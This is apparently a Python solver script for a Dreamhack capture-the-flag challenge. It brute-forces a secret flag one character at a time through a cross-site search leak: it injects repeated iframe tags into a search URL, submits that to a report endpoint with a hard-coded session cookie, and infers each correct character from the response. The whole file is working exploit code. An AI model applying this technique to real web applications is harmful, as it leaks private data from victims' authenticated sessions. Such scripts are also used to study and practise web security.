import requests
import string

textTable = string.ascii_lowercase + string.digits

url = "http://host3.dreamhack.games:23136/report"

cookies = {"session":"eyJpc0FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiIxMjM0In0.Z1aOPA.nuEXa8q_-NEfZ6auGTeb3_Z43a8"}

flag = "DH{ffd487acb607e4108a9552aee8e3604f}"

while True:
    for i in textTable:
        exploitText = f'<iframe src="/search?keyword={flag+i}"></iframe>'

        exploitTable = "/search?keyword="+exploitText*100

        res = requests.post(url=url, cookies=cookies, data={"path":exploitTable})

        print(exploitText)
        if "fail" in res.text[1100:]:
            print("FIND!", i)
            flag += i
            break